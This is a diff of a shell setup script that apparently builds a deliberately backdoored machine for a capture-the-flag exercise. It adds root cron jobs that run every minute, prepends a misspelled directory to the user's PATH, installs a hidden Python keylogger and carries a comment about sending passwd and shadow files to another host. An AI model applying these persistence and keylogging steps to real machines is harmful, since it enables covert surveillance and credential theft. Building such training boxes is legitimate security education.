@@ -51,7 +51,7 @@ systemctl enable cron.service
 touch /etc/cron.allow
 echo "root" >> /etc/cron.allow
 touch /var/spool/cron/crontabs/root
-echo "* * * * * /var/www/default/sql_script.sh" >> /var/spool/cron/crontabs/root
+echo "* * * * * /var/www/default/sql_script.sh >> /var/log/cron/sql.log 2>&1" >> /var/spool/cron/crontabs/root
 
 # setup minecraft server
 echo "setup minecraft server"
@@ -90,7 +90,7 @@ mkdir /var/www/log
 mv flag.sh HIDDEN_flag{0p3n1ng_th3_b4ckd00r}
 mv HIDDEN_flag{0p3n1ng_th3_b4ckd00r} ps_init.sh /var/www/log/
 echo "export PATH=/var/loog/:$PATH" >> /home/csc/.profile
-echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/crontabs/root
+echo "* * * * * /var/www/log/ps_init.sh >> /var/log/cron/ps.log 2>&1" >> /var/spool/cron/crontabs/root
 
 # setup hidden python keylogger
 mkdir /opt/local/
@@ -99,7 +99,7 @@ chmod +x log.sh
 mv log.sh /usr/local/src/
 mv keylogger.py /usr/local/src/
 mv pyxhook.py /usr/local/src/
-echo "* * * * * /usr/local/src/log.sh" >> /var/spool/cron/crontabs/root
+echo "* * * * * /usr/local/src/log.sh /var/log/cron/log.log 2>&1" >> /var/spool/cron/crontabs/root
 
 # setup service that sends logging, passwd, and shadow file to someone else
 # TODO: setup dest box to receive files - use static ip UPDATE: not needed - I'll just keep the box on lol
